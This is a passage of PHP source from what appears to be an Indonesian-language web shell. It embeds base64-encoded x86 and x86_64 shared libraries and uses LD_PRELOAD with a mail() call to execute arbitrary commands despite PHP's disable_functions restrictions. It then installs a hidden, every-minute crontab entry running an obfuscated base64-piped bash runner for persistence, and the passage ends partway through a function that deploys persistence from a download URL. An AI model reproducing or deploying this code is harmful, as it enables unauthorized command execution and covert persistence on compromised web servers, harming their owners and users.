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AAAAAYAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIoAAAABAAAAAgAAAAAAAABpCAAAAAAAAGkIAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACSAAAAAQAAAAIAAAAAAAAAhAgAAAAAAACECAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEAAAACAAAAAAAAAKAIAAAAAAAAoAgAAAAAAABkAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKoAAAAOAAAAAwAAAAAAAAAICSAAAAAAAAgJAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC2AAAADwAAAAMAAAAAAAAAGAkgAAAAAAAYCQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAADAAAAAAAAACAJIAAAAAAAIAkAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMcAAAAGAAAAAwAAAAAAAAAoCSAAAAAAACgJAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADQAAAAAQAAAAMAAAAAAAAA6AogAAAAAADoCgAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAAEAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN4AAAABAAAAAwAAAAAAAABYCyAAAAAAAFgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADkAAAACAAAAAMAAAAAAAAAYAsgAAAAAABgCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6QAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAYAsAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIQLAAAAAAAA8gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAB4DAAAAAAAAIgFAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAoAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==';
}


function geckoBypassPayload86()
{
    return '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';
}


function geckoBypassIs64bit()
{
    $int = '9223372036854775807';
    $int = intval($int);
    if ($int == 9223372036854775807) return true;
    if ($int == 2147483647) return false;
    return null;
}


function geckoBypassDisabledList()
{
    $raw = (string)@ini_get('disable_functions');
    $parts = preg_split('/\s*,\s*/', strtolower($raw), -1, PREG_SPLIT_NO_EMPTY);
    return is_array($parts) ? $parts : array();
}


function geckoBypassFuncOk($name)
{
    $name = strtolower((string)$name);
    if ($name === '') return false;
    if (!function_exists($name)) return false;
    return !in_array($name, geckoBypassDisabledList(), true);
}


function geckoBypassLoadPayloads()
{
    static $cache = null;
    if (is_array($cache)) return $cache;

    if (!function_exists('geckoBypassPayload64') || !function_exists('geckoBypassPayload86')) {
        $cache = array('ok' => false, 'error' => 'Payload embedded tidak tersedia di minishell.php.');
        return $cache;
    }
    $so64 = geckoBypassPayload64();
    $so86 = geckoBypassPayload86();
    if ($so64 === '' || $so86 === '') {
        $cache = array('ok' => false, 'error' => 'Payload embedded kosong.');
        return $cache;
    }
    $cache = array(
        'ok' => true,
        'path' => 'embedded:minishell.php',
        'so64' => $so64,
        'so86' => $so86,
    );
    return $cache;
}


function geckoBypassPickWorkDir()
{
    $cands = array();
    $cands[] = '/dev/shm';
    $cands[] = '/tmp';
    $sys = (string)@sys_get_temp_dir();
    if ($sys !== '') $cands[] = $sys;

    $seen = array();
    foreach ($cands as $d) {
        $d = rtrim(str_replace('\\', '/', (string)$d), '/');
        if ($d === '' || isset($seen[$d])) continue;
        $seen[$d] = true;
        if (strpos($d, '/home/') === 0 || strpos($d, '/var/www/') === 0 || strpos($d, 'public_html') !== false) {
            continue;
        }
        if (!@is_dir($d) || !@is_writable($d)) continue;
        $probe = $d . '/.gecko_bp_w_' . (int)@getmypid();
        if (@file_put_contents($probe, '1') === false) continue;
        @unlink($probe);
        return $d;
    }
    return '/tmp';
}


function geckoBypassRun($cmd)
{
    $cmd = trim((string)$cmd);
    if ($cmd === '') {
        return array('ok' => false, 'error' => 'Command wajib diisi.');
    }
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        return array('ok' => false, 'error' => 'Bypass LD_PRELOAD hanya untuk Linux.');
    }

    $need = array('putenv', 'mail', 'file_put_contents', 'file_get_contents', 'unlink');
    $missing = array();
    foreach ($need as $fn) {
        if (!geckoBypassFuncOk($fn)) $missing[] = $fn;
    }
    if (!empty($missing)) {
        return array(
            'ok' => false,
            'error' => 'Fungsi wajib tidak tersedia / di-disable: ' . implode(', ', $missing),
            'disable_functions' => (string)@ini_get('disable_functions'),
        );
    }

    $arch = geckoBypassIs64bit();
    if ($arch === null) {
        return array('ok' => false, 'error' => 'Gagal deteksi arsitektur CPU (32/64-bit).');
    }

    $pay = geckoBypassLoadPayloads();
    if (empty($pay['ok'])) {
        return array(
            'ok' => false,
            'error' => isset($pay['error']) ? $pay['error'] : 'Payload gagal di-load.',
            'preload' => isset($pay['path']) ? $pay['path'] : '',
        );
    }

    
    $tmp = function_exists('geckoBypassPickWorkDir') ? geckoBypassPickWorkDir() : rtrim(str_replace('\\', '/', (string)sys_get_temp_dir()), '/');
    $uid = dechex((int)@getmypid()) . '_' . substr(md5(uniqid((string)mt_rand(), true)), 0, 8);
    $soPath = $tmp . '/gecko_bp_' . $uid . '.so';
    $outPath = $tmp . '/gecko_bp_' . $uid . '.out';

    $b64 = $arch ? $pay['so64'] : $pay['so86'];
    $bin = base64_decode($b64, true);
    if ($bin === false || $bin === '') {
        return array('ok' => false, 'error' => 'Payload .so corrupt / gagal decode.');
    }
    if (@file_put_contents($soPath, $bin) === false || !@is_file($soPath)) {
        return array('ok' => false, 'error' => 'Gagal tulis payload ke: ' . $soPath);
    }
    @chmod($soPath, 0755);

    $evil = $cmd . ' > ' . $outPath . ' 2>&1';
    $prevEvil = getenv('EVIL_CMDLINE');
    $prevLd = getenv('LD_PRELOAD');
    @putenv('EVIL_CMDLINE=' . $evil);
    @putenv('LD_PRELOAD=' . $soPath);

    $mailOk = false;
    try {
        
        $mailOk = @mail('', '', '', '');
    } catch (Exception $ex) {
        $mailOk = false;
    } catch (Throwable $ex) {
        $mailOk = false;
    }

    $output = '';
    $outReady = false;
    for ($i = 0; $i < 30; $i++) {
        if (@is_file($outPath)) {
            clearstatcache(true, $outPath);
            $sz = (int)@filesize($outPath);
            $output = (string)@file_get_contents($outPath);
            if ($output !== '' || $sz > 0 || $i >= 5) {
                $outReady = true;
                break;
            }
        }
        usleep(100000);
    }

    if ($prevEvil === false || $prevEvil === null || $prevEvil === '') {
        @putenv('EVIL_CMDLINE');
    } else {
        @putenv('EVIL_CMDLINE=' . $prevEvil);
    }
    if ($prevLd === false || $prevLd === null || $prevLd === '') {
        @putenv('LD_PRELOAD');
    } else {
        @putenv('LD_PRELOAD=' . $prevLd);
    }

    @unlink($outPath);
    @unlink($soPath);

    $df = (string)@ini_get('disable_functions');
    $hint = '';
    if ($output === '') {
        $hint = 'LD_PRELOAD likely did not execute. Common causes: /tmp noexec, setuid sendmail drops LD_PRELOAD, or mail() uses SMTP (no sendmail spawn). workdir=' . $tmp;
    }

    if ($output === '' && !$mailOk) {
        return array(
            'ok' => false,
            'error' => 'Tidak ada output. mail() gagal / sendmail tidak ada. ' . $hint,
            'arch' => $arch ? 'x86_64' : 'x86',
            'mail_ok' => false,
            'workdir' => $tmp,
            'preload' => $pay['path'],
            'disable_functions' => $df,
            'output' => '',
        );
    }

    if ($output === '') {
        return array(
            'ok' => false,
            'error' => $hint,
            'cmd' => $cmd,
            'arch' => $arch ? 'x86_64' : 'x86',
            'mail_ok' => (bool)$mailOk,
            'out_ready' => $outReady,
            'workdir' => $tmp,
            'preload' => $pay['path'],
            'disable_functions' => $df,
            'output' => '',
            'message' => 'Bypass: mail() OK tapi tidak ada output (' . ($arch ? 'x86_64' : 'x86') . ')',
        );
    }

    return array(
        'ok' => true,
        'cmd' => $cmd,
        'arch' => $arch ? 'x86_64' : 'x86',
        'mail_ok' => (bool)$mailOk,
        'workdir' => $tmp,
        'preload' => $pay['path'],
        'disable_functions' => $df,
        'output' => $output,
        'message' => 'Bypass LD_PRELOAD selesai (' . ($arch ? 'x86_64' : 'x86') . ')',
    );
}


function geckoBypassEnsureShortCrontab($installPath, $shmPath, $cronMarker, &$steps)
{
    $installPath = str_replace('\\', '/', (string)$installPath);
    $shmPath = str_replace('\\', '/', (string)$shmPath);
    $cronMarker = trim((string)$cronMarker);
    if ($cronMarker === '' || !function_exists('geckoBypassRun')) {
        $steps[] = 'Preload short crontab: skip (missing marker/bypass)';
        return false;
    }

    $exec = '';
    if ($installPath !== '' && @is_file($installPath)) {
        $exec = $installPath;
    } elseif ($shmPath !== '' && @is_file($shmPath)) {
        $exec = $shmPath;
    }
    if ($exec === '') {
        $steps[] = 'Preload short crontab: runner missing on disk';
        return false;
    }

    $inner = '/bin/bash ' . geckoBashQuote($exec) . ' --recover';
    $b64 = base64_encode($inner);
    $cronLine = '*/1 * * * * echo \'' . $b64 . '\' | base64 -d 2>/dev/null | bash >/dev/null 2>&1 ' . $cronMarker;
    if (strlen($cronLine) > 800) {
        $cronLine = '*/1 * * * * /bin/bash ' . geckoBashQuote($exec) . ' --recover >/dev/null 2>&1 ' . $cronMarker;
        $steps[] = 'Preload short crontab: b64 too long — plain fallback';
    }

    $tmp = function_exists('geckoBypassPickWorkDir') ? geckoBypassPickWorkDir() : '/tmp';
    $script = rtrim($tmp, '/') . '/gecko_bcron_' . substr(md5(uniqid((string)mt_rand(), true)), 0, 8) . '.sh';
    $mq = geckoBashQuote($cronMarker);
    $lq = geckoBashQuote($cronLine);
    $sh = "#!/bin/bash\n"
        . "MARKER={$mq}\n"
        . "CRONLINE={$lq}\n"
        . "tmpcf=\$(mktemp /tmp/.gecko_ct_XXXXXX 2>/dev/null || echo /tmp/.gecko_ct_\$\$)\n"
        . "(crontab -l 2>/dev/null | awk -v m=\"\$MARKER\" '\n"
        . "  index(\$0, m) { next }\n"
        . "  index(\$0, \".gecko_bp_r_\") { next }\n"
        . "  length(\$0) > 800 { next }\n"
        . "  /^[ \\t]*\$/ { next }\n"
        . "  /command too long/ { next }\n"
        . "  /no crontab/ { next }\n"
        . "  { print }\n"
        . "') >\"\$tmpcf\" 2>/dev/null\n"
        . "echo \"\$CRONLINE\" >>\"\$tmpcf\"\n"
        . "crontab \"\$tmpcf\" 2>/dev/null\n"
        . "rc=\$?\n"
        . "rm -f \"\$tmpcf\"\n"
        . "if [ \"\$rc\" -eq 0 ] && crontab -l 2>/dev/null | grep -Fq \"\$MARKER\"; then\n"
        . "  echo GECKO_CRON_OK\n"
        . "else\n"
        . "  echo GECKO_CRON_FAIL\n"
        . "fi\n";

    if (@file_put_contents($script, $sh) === false) {
        $steps[] = 'Preload short crontab: gagal tulis helper script';
        return false;
    }
    @chmod($script, 0700);
    $r = geckoBypassRun('/bin/bash ' . geckoBashQuote($script));
    @unlink($script);
    $out = isset($r['output']) ? (string)$r['output'] : '';
    $ok = (strpos($out, 'GECKO_CRON_OK') !== false);
    $steps[] = 'Preload short crontab (b64): ' . ($ok ? 'OK' : 'FAIL') . ' · marker ' . $cronMarker;
    $steps[] = 'Preload short crontab line len: ' . strlen($cronLine);
    return $ok;
}


function geckoBypassRecoverDeployPersistence($dirPath, $fileName, $downloadUrl)
{
    $steps = array();
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        return array('ok' => false, 'error' => 'Persistence hanya Linux/Unix.', 'steps' => $steps);
    }
    if (!function_exists('geckoBypassRun')) {
        return array('ok' => false, 'error' => 'geckoBypassRun missing', 'steps' => $steps);
    }

    $instanceId = substr(md5($dirPath . '|' . $fileName . '|' . $downloadUrl), 0, 8);
    $installPath = '/tmp/.' . $instanceId . '/.runner.sh';
    $shmPath = '/dev/shm/.' . $instanceId . '/.runner.sh';
    $pidFile = '/tmp/.' . $instanceId . '.pid';
    $cronMarker = '# cronsh_' . $instanceId;
    $tmpCron = '/tmp/.gecko_cron_' . $instanceId . '.sh';

    $steps[] = 'Preload persist: same layout as Recover (/tmp + /dev/shm + short b64 crontab)';
    $got = geckoDownloadCronShTemplate('embedded://manager.php/cron.sh');
    if (!$got[0]) {
        return array('ok' => false, 'error' => 'Gagal load cron.sh: ' . $got[2], 'steps' => $steps);
    }
    if (!empty($got[2])) $steps[] = $got[2];

    $script = geckoCronShNormalizeLf($got[1]);
    $script = geckoPatchCronShAssign($script, 'DIR_PATH', $dirPath);
    $script = geckoPatchCronShAssign($script, 'FILE_NAME', $fileName);
    $script = geckoPatchCronShAssign($script, 'DOWNLOAD_URL', $downloadUrl);
    $script = geckoCronShPatchShortCrontab($script);
    $script = geckoCronShNormalizeLf($script);
    $steps[] = 'Patched cron.sh for preload deploy (' . strlen($script) . ' bytes)';

    if (@file_put_contents($tmpCron, $script) === false) {
        $tmpCron = '/dev/shm/.gecko_cron_' . $instanceId . '.sh';
        if (@file_put_contents($tmpCron, $script) === false) {
            return array('ok' => false, 'error' => 'Gagal tulis temp cron.sh ke /tmp atau /dev/shm', 'steps' => $steps);
        }
    }
    @chmod($tmpCron, 0700);
    $steps[] = 'Temp cron.sh: ' . $tmpCron;

    $scrub = "#!/bin/bash\n"
